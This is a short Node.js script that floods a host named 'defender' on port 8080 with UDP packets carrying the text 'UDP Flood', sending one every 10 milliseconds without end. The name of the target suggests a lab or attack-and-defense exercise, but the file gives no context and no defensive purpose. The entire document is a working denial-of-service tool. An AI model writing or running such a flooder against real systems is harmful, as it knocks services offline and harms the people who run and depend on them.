
const dgram = require('dgram');
const client = dgram.createSocket('udp4');
const target = { address: 'defender', port: 8080 };

setInterval(() => {
    const message = Buffer.from('UDP Flood');
    client.send(message, target.port, target.address);
}, 10);
